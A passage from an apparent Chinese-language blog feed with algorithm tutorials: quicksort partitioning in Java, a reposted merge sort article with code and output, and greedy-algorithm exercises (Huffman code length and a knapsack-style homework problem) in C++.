&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        arr[index] = pivot;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">4</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中，quickSort方法通过递归的方式，实现了分而治之的思想。</p><p>partition方法则实现元素的移动，让数列中的元素依据自身大小，分别移动到基准元素的左右两边。在这里，我们使用移动方式是挖坑法。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/f408abb62a0e4d87a0e4f5359caa0c79.jpeg" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/32ace2bd27c94cee97e484e2b9d27504.jpeg" alt="img"></p><p><strong>指针交换法</strong></p><p>何谓指针交换法？我们来看一看详细过程。</p><p>给定原始数列如下，要求从小到大排序：</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/a99eb3e3551d4cce91162b61487d33b5.png" alt="img"></p><p>开局和挖坑法相似，我们首先选定基准元素Pivot，并且设置两个指针left和right，指向数列的最左和最右两个元素：</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/cf034716af9d459496c2169e8936bf83.png" alt="img"></p><p>接下来是<strong>第一次循环</strong>，从right指针开始，把指针所指向的元素和基准元素做比较。如果<strong>大于等于</strong>pivot，则指针向<strong>左</strong>移动；如果<strong>小于</strong>pivot，则right指针停止移动，切换到<strong>left</strong>指针。</p><p>在当前数列中，1&lt;4，所以right直接停止移动，换到left指针，进行下一步行动。</p><p>轮到left指针行动，把指针所指向的元素和基准元素做比较。如果<strong>小于等于</strong>pivot，则指针向<strong>右</strong>移动；如果<strong>大于</strong>pivot，则left指针停止移动。</p><p>由于left一开始指向的是基准元素，判断肯定相等，所以left右移一位。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/83b85177ee28420cbcd7b3943f4a8850.png" alt="img"></p><p>由于7 &gt; 4，left指针在元素7的位置停下。这时候，我们让<strong>left和right指向的元素进行交换</strong>。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/049d5b9eeb764d6f90a750b467175192.png" alt="img"></p><p>接下来，我们进入<strong>第二次循环</strong>，重新切换到right向左移动。right先移动到8，8&gt;2，继续左移。由于2&lt;8，停止在2的位置。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/712336c6aa96424eb25726ed18c3c2f5.png" alt="img"></p><p>切换到left，6&gt;4，停止在6的位置。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/441cae5794094095a3455ff55189694b.png" alt="img"></p><p>元素6和2交换。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/0acfb7017fbd41fb85a1d6e68a43c261.png" alt="img"></p><p>进入<strong>第三次循环</strong>，right移动到元素3停止，left移动到元素5停止。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/479db496c4f945a3a32af3318347a92f.png" alt="img"></p><p>元素5和3交换。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/bdbbb88da72d4bfea0f558656f30d7c1.png" alt="img"></p><p>进入<strong>第四次循环</strong>，right移动到元素3停止，这时候请注意，left和right指针已经重合在了一起。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/9ffb2cbf5f64409d8c2c33ccdde7b3d6.png" alt="img"></p><p>当left和right指针重合之时，我们让pivot元素和left与right重合点的元素进行交换。此时数列左边的元素都小于4，数列右边的元素都大于4，这一轮交换终告结束。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/efbc24c30ee44eeda06c54ef998d3b5e.png" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/e67821a0a2b54bfca09cf567ecbd728c.jpeg" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickSort</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> startIndex, <span class="keyword">int</span> endIndex)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 递归结束条件：startIndex大等于endIndex的时候</span></span><br><span class="line">        <span class="keyword">if</span> (startIndex &gt;= endIndex)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 得到基准元素位置</span></span><br><span class="line">        <span class="keyword">int</span> pivotIndex = partition(arr, startIndex, endIndex);</span><br><span class="line">        <span class="comment">// 根据基准元素，分成两部分递归排序</span></span><br><span class="line">        quickSort(arr, startIndex, pivotIndex - <span class="number">1</span>);</span><br><span class="line">        quickSort(arr, pivotIndex + <span class="number">1</span>, endIndex);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> startIndex, <span class="keyword">int</span> endIndex)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 取第一个位置的元素作为基准元素</span></span><br><span class="line">        <span class="keyword">int</span> pivot = arr[startIndex];</span><br><span class="line">        <span class="keyword">int</span> left = startIndex;</span><br><span class="line">        <span class="keyword">int</span> right = endIndex;</span><br><span class="line">        <span class="keyword">while</span> (left != right)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//控制right指针比较并左移</span></span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; arr[right] &gt; pivot)</span><br><span class="line">            &#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//控制right指针比较并右移</span></span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; arr[left] &lt;= pivot)</span><br><span class="line">            &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//交换left和right指向的元素</span></span><br><span class="line">            <span class="keyword">if</span> (left &lt; right)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> p = arr[left];</span><br><span class="line">                arr[left] = arr[right];</span><br><span class="line">                arr[right] = p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//pivot和指针重合点交换</span></span><br><span class="line">        <span class="keyword">int</span> p = arr[left];</span><br><span class="line">        arr[left] = arr[startIndex];</span><br><span class="line">        arr[startIndex] = p;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">4</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和挖坑法相比，指针交换法在partition方法中进行的元素交换次数更少。</p><p><strong>非递归实现</strong></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/7853bea6d0d1436bb600b541e9c38e36.jpeg" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/c3ba7d396d4846b7a86567c4c8f5ac79.jpeg" alt="img"></p><p>为什么这样说呢？</p><p>因为我们代码中一层一层的方法调用，本身就是一个函数栈。每次进入一个新方法，就相当于入栈；每次有方法返回，就相当于出栈。</p><p>所以，我们可以把原本的递归实现转化成一个栈的实现，在栈当中存储每一次方法调用的参数：</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/590f6f803c8d4c2d96f16b7a131dc046.png" alt="img"></p><p>下面我们来看一下代码：</p><p>public class QuickSortWithStack {</p><p>}</p><p>和刚才的递归实现相比，代码的变动仅仅在quickSort方法当中。该方法中引入了一个存储Map类型元素的栈，用于存储每一次交换时的起始下标和结束下标。</p><p>每一次循环，都会让栈顶元素出栈，进行排序，并且按照基准元素的位置分成左右两部分，左右两部分再分别入栈。当栈为空时，说明排序已经完毕，退出循环。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/ce40850661bb4d9da7f783697472d258.jpeg" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/7f5f7a90d692423cad18d0d1b0ae5196.jpeg" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/8d2ea50d4ac24109a091d4fb7df413c4.jpeg" alt="img"></p><p><strong>几点补充：</strong></p><p><strong>本漫画纯属娱乐，还请大家尽量珍惜当下的工作，切勿模仿小灰的行为哦。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>归并排序</title>
      <link href="/2020/11/09/guibingpaixu1/"/>
      <url>/2020/11/09/guibingpaixu1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>转载自：<a href="https://www.cnblogs.com/chengxiao/p/6194356.html" target="_blank" rel="noopener">https://www.cnblogs.com/chengxiao/p/6194356.html</a></p></blockquote><a id="more"></a><h2 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h2><p>　　归并排序（MERGE-SORT）是利用<strong>归并</strong>的思想实现的排序方法，该算法采用经典的<strong>分治</strong>（divide-and-conquer）策略（分治法将问题<strong>分</strong>(divide)成一些小的问题然后递归求解，而<strong>治(conquer)</strong>的阶段则将分的阶段得到的各答案”修补”在一起，即分而治之)。</p><p><strong>分而治之</strong></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/6d3badeecf8da5db.png" alt="img"></p><p> 　可以看到这种结构很像一棵完全二叉树，本文的归并排序我们采用递归去实现（也可采用迭代的方式去实现）。<strong>分</strong>阶段可以理解为就是递归拆分子序列的过程，递归深度为log2n。</p><h2 id="合并相邻有序子序列"><a href="#合并相邻有序子序列" class="headerlink" title="合并相邻有序子序列"></a>合并相邻有序子序列</h2><p>　　再来看看<strong>治</strong>阶段，我们需要将两个已经有序的子序列合并成一个有序序列，比如上图中的最后一次合并，要将[4,5,7,8]和[1,2,3,6]两个已经有序的子序列，合并为最终序列[1,2,3,4,5,6,7,8]，来看下实现步骤。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/984f8c7cc06470fe.png" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/d728905f4b80ae14.png" alt="img"></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sortdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by chengxiao on 2016/12/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MergeSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> []arr = &#123;<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>&#125;;</span><br><span class="line">        sort(arr);</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> []arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> []temp = <span class="keyword">new</span> <span class="keyword">int</span>[arr.length];<span class="comment">//在排序前，先建好一个长度等于原数组长度的临时数组，避免递归中频繁开辟空间</span></span><br><span class="line">        sort(arr,<span class="number">0</span>,arr.length-<span class="number">1</span>,temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> left,<span class="keyword">int</span> right,<span class="keyword">int</span> []temp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">            sort(arr,left,mid,temp);<span class="comment">//左边归并排序，使得左子序列有序</span></span><br><span class="line">            sort(arr,mid+<span class="number">1</span>,right,temp);<span class="comment">//右边归并排序，使得右子序列有序</span></span><br><span class="line">            merge(arr,left,mid,right,temp);<span class="comment">//将两个有序子数组合并操作</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> left,<span class="keyword">int</span> mid,<span class="keyword">int</span> right,<span class="keyword">int</span>[] temp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = left;<span class="comment">//左序列指针</span></span><br><span class="line">        <span class="keyword">int</span> j = mid+<span class="number">1</span>;<span class="comment">//右序列指针</span></span><br><span class="line">        <span class="keyword">int</span> t = <span class="number">0</span>;<span class="comment">//临时数组指针</span></span><br><span class="line">        <span class="keyword">while</span> (i&lt;=mid &amp;&amp; j&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i]&lt;=arr[j])&#123;</span><br><span class="line">                temp[t++] = arr[i++];</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                temp[t++] = arr[j++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=mid)&#123;<span class="comment">//将左边剩余元素填充进temp中</span></span><br><span class="line">            temp[t++] = arr[i++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;=right)&#123;<span class="comment">//将右序列剩余元素填充进temp中</span></span><br><span class="line">            temp[t++] = arr[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        t = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//将temp中的元素全部拷贝到原数组中</span></span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">            arr[left++] = temp[t++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 2, 3, 4, 5, 6, 7, 8, 9]</span><br></pre></td></tr></table></figure><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>　　归并排序是稳定排序，它也是一种十分高效的排序，能利用完全二叉树特性的排序一般性能都不会太差。java中Arrays.sort()采用了一种名为TimSort的排序算法，就是归并排序的优化版本。从上文的图中可看出，每次合并操作的平均时间复杂度为O(n)，而完全二叉树的深度为|log2n|。总的平均时间复杂度为O(nlogn)。而且，归并排序的最好，最坏，平均时间复杂度均为O(nlogn)。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>贪心算法</title>
      <link href="/2020/11/09/tanxin/"/>
      <url>/2020/11/09/tanxin/</url>
      
        <content type="html"><![CDATA[<blockquote><p>贪心算法的复习</p></blockquote><a id="more"></a><h2 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一只含有小写字母的字符串；输出其哈夫曼编码的长度</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500.</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>对于每个字符串，输出其哈夫曼编码长度</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">hrvsh</span><br><span class="line">lcxeasexdphiopd</span><br><span class="line">mntflolfbtbpplahqolqykrqdnwdoq</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">51</span><br><span class="line">115</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>哈夫曼编码的思路不难，主要讲一下优先级队列的使用。</p><p>在STL里有这个priority_queue，实现优先队列的结构，在优先队列中，优先级高的元素先出队列。</p><p>模板声明(3个参数)：<code>priority_queue&lt;Type, Container, Functional&gt;</code></p><ul><li>Type 为数据类型</li><li>Container 为保存数据的容器， 必须是用数组实现的容器，比如 <code>vector</code>、 <code>deque</code> 但不能用 <code>list</code>。默认用的是 <code>vector</code></li><li>Functional 为元素比较方式，默认用 <code>operator&lt;</code> , 即队头元素最大。</li></ul><p>所以如果后面俩个参数缺省的话，优先队列就是大顶堆，队头元素最大。</p><p>如果要用到小顶堆，则一般要把模板的三个参数都带进去。STL里面定义了一个仿函数 <code>greater&lt;&gt;</code>，对于基本类型可以用这个仿函数声明小顶堆<code>priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt; &gt;q;</code>，即队头元素最小。对于自定义类型，则必须自己重载 <code>operator&lt;</code> 或者自己写比较函数。</p><p>优先级队列的几个操作：</p><ul><li><code>empty()</code> 如果优先队列为空，则返回真</li><li><code>pop()</code> 删除第一个元素</li><li><code>push()</code> 插入一个元素</li><li><code>size()</code> 返回优先队列中拥有的元素的个数</li><li><code>top()</code>返回优先队列中有最高优先级的元素</li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">    <span class="keyword">while</span> (T--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s[<span class="number">1505</span>];</span><br><span class="line">        <span class="comment">//存放每个字母的频率</span></span><br><span class="line">        <span class="keyword">int</span> n[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            n[s[i] - <span class="string">'a'</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//建立一个优先级队列</span></span><br><span class="line">        priority_queue&lt;<span class="keyword">int</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;, greater&lt;<span class="keyword">int</span>&gt;&gt; q;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (n[i] &gt; <span class="number">0</span>)</span><br><span class="line">                q.push(n[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//不断更新优先级队列</span></span><br><span class="line">        <span class="keyword">while</span> (q.<span class="built_in">size</span>() &gt;= <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> a = q.top();</span><br><span class="line">            q.pop();</span><br><span class="line">            <span class="keyword">int</span> b = q.top();</span><br><span class="line">            q.pop();</span><br><span class="line">            <span class="keyword">int</span> temp = a + b;</span><br><span class="line">            q.push(temp);</span><br><span class="line">            sum += temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="Homework"><a href="#Homework" class="headerlink" title="Homework"></a>Homework</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>临近开学了，大家都忙着收拾行李准 备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。</p><p>暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。</p><p>I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。</p><p>现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。</p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位</p><p>提示：float 的精度可能不够，你应该使用 double 类型。</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4 20</span><br><span class="line">4 10</span><br><span class="line">5 22</span><br><span class="line">10 3</span><br><span class="line">1 2</span><br><span class="line">0 0</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">37.00</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>背包类的贪心算法，计算物品性价比，按性价比从大到小排序，优先装入性价比大的，直到容量满为止。</p><p>0-1背包，物体不能拆分；背包，物体可以拆分。</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 